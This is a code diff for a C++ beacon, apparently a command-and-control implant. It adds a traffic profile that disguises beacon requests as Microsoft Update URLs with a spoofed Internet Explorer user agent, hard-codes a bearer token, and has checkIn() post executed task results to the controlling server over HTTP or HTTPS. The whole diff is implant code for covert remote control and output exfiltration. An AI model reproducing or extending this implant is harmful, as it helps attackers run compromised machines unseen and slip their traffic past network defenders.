@@ -1,7 +1,5 @@
 #include "BeaconHttp.hpp"
 
-#include "Config.hpp"
-
 
 #ifdef __linux__
 
@@ -19,21 +17,38 @@
 using namespace std;
 
 
+const std::string HttpsEndPoint = "/HttpsEndPoint";
+const std::string HttpsContentType = "text/plain";
+
+const std::string HttpEndPoint = "/HttpEndPoint";
+const std::string HttpContentType = "text/plain";
+
+
+json httpGet = {
+	{"http-get", {
+		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
+		{"client", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}},
+		{"server", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}}
+  	}},
+	{"http-post", {
+		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
+		{"client", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}},
+		{"server", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}}
+  	}}
+};
+
+
 #ifdef __linux__
 
 using namespace httplib;
-
-const httplib::Headers httpClientHeaders = {
-  { "Accept-Encoding", "gzip, deflate" },
-  { "Authorization", "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd" },
-  { "User-Agent", "http client agent" }
-};
-
-const httplib::Headers httpsClientHeaders = {
-  { "Accept-Encoding", "gzip, deflate" },
-  { "User-Agent", "https client agent" }
-};
-
 
 #elif _WIN32
 
@@ -89,8 +104,12 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         dwFlags);
 
-    LPCWSTR additionalHeaders = L"Content-Type: text/plain\r\n";
-    DWORD headersLength = -1;
+    // Add a request header.
+    if( hRequest )
+        bResults = WinHttpAddRequestHeaders( hRequest, 
+                                            L"If-Modified-Since: Mon, 20 Nov 2000 20:00:00 GMT",
+                                            (ULONG)-1L,
+                                            WINHTTP_ADDREQ_FLAG_ADD );
 
     if(isHttps)
     {
@@ -223,6 +242,11 @@ void BeaconHttp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
+        httplib::Headers httpsClientHeaders = {
+            { "Accept-Encoding", "gzip, deflate" },
+            { "User-Agent", "https client agent" }
+        };
+
         if (auto res = cli.Post(HttpsEndPoint, httpsClientHeaders, output, HttpsContentType))
         {
             if (res->status == 200) 
@@ -241,6 +265,12 @@ void BeaconHttp::checkIn()
 
         std::string output;
         taskResultsToCmd(output);
+
+        httplib::Headers httpClientHeaders = {
+            { "Accept-Encoding", "gzip, deflate" },
+            { "Authorization", "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd" },
+            { "User-Agent", "http client agent" }
+        };
 
         if (auto res = cli.Post(HttpEndPoint, httpClientHeaders, output, HttpContentType))
         {
